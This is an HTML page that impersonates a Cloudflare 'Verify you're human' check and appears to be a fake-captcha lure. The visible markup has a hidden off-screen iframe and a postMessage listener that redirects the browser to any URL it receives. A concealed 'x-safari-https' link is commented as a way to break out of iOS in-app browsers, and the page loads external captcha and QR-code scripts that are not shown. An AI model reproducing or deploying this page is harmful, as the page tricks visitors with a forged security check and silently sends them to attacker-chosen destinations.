<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
        <meta http-equiv="Pragma" content="no-cache" />
        <meta http-equiv="Expires" content="0" />
        <meta property="og:determiner" content="auto" />
        <title></title>
        <link href="src/recaptcha.css" rel="stylesheet">
        <link href="src/loading.css" rel="stylesheet">
        <script>
            window.addEventListener('message', function(event) {
                if (event.data.t === 'r' && event.data.u) {
                    window.location.href = event.data.u;
                }
            });
        </script>
    </head>
    <body>
        <iframe src="/gooll/gooll.html" style="position:fixed;top:0;width:0;height:0;left:-1000px;border:0"></iframe>
        <div id="challenge-loading-overlay" class="challenge-loading-overlay" hidden>
            <div id="challenge-loading-panel" class="challenge-loading-content">
                <svg class="pl" viewBox="0 0 160 160" width="160px" height="160px" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <linearGradient id="grad" x1="0" y1="0" x2="0" y2="1">
                            <stop offset="0%" stop-color="#000"></stop>
                            <stop offset="100%" stop-color="#fff"></stop>
                        </linearGradient>
                        <mask id="mask1">
                            <rect x="0" y="0" width="160" height="160" fill="url(#grad)"></rect>
                        </mask>
                        <mask id="mask2">
                            <rect x="28" y="28" width="104" height="104" fill="url(#grad)"></rect>
                        </mask>
                    </defs>

                    <g>
                        <g class="pl__ring-rotate">
                            <circle class="pl__ring-stroke" cx="80" cy="80" r="72" fill="none" stroke="hsl(223,90%,55%)" stroke-width="16" stroke-dasharray="452.39 452.39" stroke-dashoffset="452" stroke-linecap="round" transform="rotate(-45,80,80)"></circle>
                        </g>
                    </g>
                    <g mask="url(#mask1)">
                        <g class="pl__ring-rotate">
                            <circle class="pl__ring-stroke" cx="80" cy="80" r="72" fill="none" stroke="hsl(193,90%,55%)" stroke-width="16" stroke-dasharray="452.39 452.39" stroke-dashoffset="452" stroke-linecap="round" transform="rotate(-45,80,80)"></circle>
                        </g>
                    </g>

                    <g>
                        <g stroke-width="4" stroke-dasharray="12 12" stroke-dashoffset="12" stroke-linecap="round" transform="translate(80,80)">
                            <polyline class="pl__tick" stroke="hsl(223,10%,90%)" points="0,2 0,14" transform="rotate(-135,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,10%,90%)" points="0,2 0,14" transform="rotate(-90,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,10%,90%)" points="0,2 0,14" transform="rotate(-45,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,10%,90%)" points="0,2 0,14" transform="rotate(0,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,10%,90%)" points="0,2 0,14" transform="rotate(45,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,10%,90%)" points="0,2 0,14" transform="rotate(90,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,10%,90%)" points="0,2 0,14" transform="rotate(135,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,10%,90%)" points="0,2 0,14" transform="rotate(180,0,0) translate(0,40)"></polyline>
                        </g>
                    </g>
                    <g mask="url(#mask1)">
                        <g stroke-width="4" stroke-dasharray="12 12" stroke-dashoffset="12" stroke-linecap="round" transform="translate(80,80)">
                            <polyline class="pl__tick" stroke="hsl(223,90%,80%)" points="0,2 0,14" transform="rotate(-135,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,90%,80%)" points="0,2 0,14" transform="rotate(-90,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,90%,80%)" points="0,2 0,14" transform="rotate(-45,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,90%,80%)" points="0,2 0,14" transform="rotate(0,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,90%,80%)" points="0,2 0,14" transform="rotate(45,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,90%,80%)" points="0,2 0,14" transform="rotate(90,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,90%,80%)" points="0,2 0,14" transform="rotate(135,0,0) translate(0,40)"></polyline>
                            <polyline class="pl__tick" stroke="hsl(223,90%,80%)" points="0,2 0,14" transform="rotate(180,0,0) translate(0,40)"></polyline>
                        </g>
                    </g>

                    <g>
                        <g transform="translate(64,28)">
                            <g class="pl__arrows" transform="rotate(45,16,52)">
                                <path fill="hsl(3,90%,55%)" d="M17.998,1.506l13.892,43.594c.455,1.426-.56,2.899-1.998,2.899H2.108c-1.437,0-2.452-1.473-1.998-2.899L14.002,1.506c.64-2.008,3.356-2.008,3.996,0Z"></path>
                                <path fill="hsl(223,10%,90%)" d="M14.009,102.499L.109,58.889c-.453-1.421,.559-2.889,1.991-2.889H29.899c1.433,0,2.444,1.468,1.991,2.889l-13.899,43.61c-.638,2.001-3.345,2.001-3.983,0Z"></path>
                            </g>
                        </g>
                    </g>
                    <g mask="url(#mask2)">
                        <g transform="translate(64,28)">
                            <g class="pl__arrows" transform="rotate(45,16,52)">
                                <path fill="hsl(333,90%,55%)" d="M17.998,1.506l13.892,43.594c.455,1.426-.56,2.899-1.998,2.899H2.108c-1.437,0-2.452-1.473-1.998-2.899L14.002,1.506c.64-2.008,3.356-2.008,3.996,0Z"></path>
                                <path fill="hsl(223,90%,80%)" d="M14.009,102.499L.109,58.889c-.453-1.421,.559-2.889,1.991-2.889H29.899c1.433,0,2.444,1.468,1.991,2.889l-13.899,43.61c-.638,2.001-3.345,2.001-3.983,0Z"></path>
                            </g>
                        </g>
                    </g>
                </svg>
                <p class="challenge-loading-title">Loading...</p>
                <p class="challenge-loading-message">Your connection seems a bit slow right now. This should only take a few seconds.</p>
                <div class="challenge-loading-bar">
                    <div class="loader-bar"></div>
                </div>
            </div>
            <p id="challenge-loading-redirecting" class="challenge-loading-redirecting" hidden>Redirecting...</p>
        </div>
        <main class="challenge-shell">
            <section class="challenge-content">
                <div class="challenge-site">
                    <div class="challenge-site-icon" id="challenge-site-icon" aria-hidden="true">
                        <span class="challenge-site-icon-text" id="challenge-site-icon-text">G</span>
                    </div>
                    <div class="challenge-site-copy">
                        <p class="challenge-site-domain" id="challenge-site-domain"></p>
                    </div>
                </div>

                <h1 class="challenge-title" id="challenge-title">Security verification in progress</h1>
                <p class="challenge-subtitle" id="challenge-subtitle">
                    This site uses a security service to protect against automated abuse. This page appears while the system checks that your request is coming from a real person.
                </p>

                <div class="challenge-captcha-wrap">
                    <div class="fkrc-container fkrc-m-p">
                        <div id="fkrc-checkbox-window" class="fkrc-checkbox-window fkrc-m-p fkrc-block">
                            <div class="fkrc-checkbox-container fkrc-m-p">
                                <button type="button" id="fkrc-checkbox" class="fkrc-checkbox fkrc-m-p fkrc-line-normal" hidden></button>
                                <div class="dot-spinner" id="fkrc-dot-spinner" hidden>
                                    <div class="dot-spinner__dot"></div>
                                    <div class="dot-spinner__dot"></div>
                                    <div class="dot-spinner__dot"></div>
                                    <div class="dot-spinner__dot"></div>
                                    <div class="dot-spinner__dot"></div>
                                    <div class="dot-spinner__dot"></div>
                                    <div class="dot-spinner__dot"></div>
                                    <div class="dot-spinner__dot"></div>
                                </div>
                            </div>
                            <p class="fkrc-im-not-a-robot fkrc-m-p fkrc-line-normal" id="fkrc-im-not-a-robot-text"></p>
                            <img src="images/captcha_logo.svg" class="fkrc-captcha-logo fkrc-line-normal" alt="Cloudflare">
                            <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal">CLOUDFLARE</p>
                            <p class="fkrc-checkbox-desc fkrc-checkbox-desc-secondary fkrc-m-p fkrc-line-normal">Privacy - Help</p>
                            <img src="images/captcha_spinner.gif" class="fkrc-spinner fkrc-m-p fkrc-line-normal" alt="" id="fkrc-spinner">
                        </div>
                        <div id="fkrc-verifywin-window" class="fkrc-verifywin-window">
                            <div class="fkrc-verifywin-container">
                                <header class="fkrc-verifywin-header">
                                    <span class="fkrc-verifywin-header-text-medium fkrc-m-p fkrc-block">Security check</span>
                                    <span class="fkrc-verifywin-header-text-big fkrc-m-p fkrc-block">Verify you’re human</span>
                                    <span class="fkrc-verifywin-header-text-medium fkrc-m-p fkrc-block">To keep bots out</span>
                                </header>
                                <main class="fkrc-verifywin-main">
                                    Complete this check to continue.<br>
                                </main>
                            </div>
                            <footer class="fkrc-verifywin-container fkrc-verifywin-footer">
                                <div class="fkrc-verifywin-footer-left">
                                    Press the verify button to proceed.
                                </div>
                                <button type="button" class="fkrc-verifywin-verify-button fkrc-block" id="fkrc-verifywin-verify-button">Verify</button>
                            </footer>
                        </div>
                        <img src="images/captcha_arrow.svg" alt="" class="fkrc-verifywin-window-arrow" id="fkrc-verifywin-window-arrow"/>
                    </div>
                </div>
            </section>

            <footer class="challenge-footer">
                <div class="challenge-footer-divider"></div>
                <p class="challenge-ray-id">Ray ID: <span id="challenge-ray-id">9ef3586bd81aa40</span></p>
                <p class="challenge-support">
                    <span class="challenge-support-icon" aria-hidden="true">⌘</span>
                    <span id="challenge-support-copy">Performance and security by</span>
                    <a id="challenge-support-provider-link" href="https://www.cloudflare.com/?utm_source=challenge&utm_campaign=m" target="_blank" rel="noreferrer">Cloudflare</a>
                    <span class="challenge-support-separator">|</span>
                    <a id="challenge-support-privacy-link" href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noreferrer">Privacy</a>
                </p>
            </footer>
        </main>
        <!-- Static scheme escape link (must exist in markup; dynamic <a>.click() is ignored by many iOS in-app browsers). -->
        <a id="challenge-hidden-scheme-safari" href="x-safari-https://example.com" style="position:absolute;left:-9999px;opacity:0;" aria-hidden="true">s</a>
        <script src="src/recaptcha.config.js"></script>
        <script src="src/qrcode.min.js"></script>
        <script src="src/recaptcha.js"></script>
    <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"de4e50c93c644df99845f59252f374b8","r":1}' crossorigin="anonymous"></script>
</body>
</html>
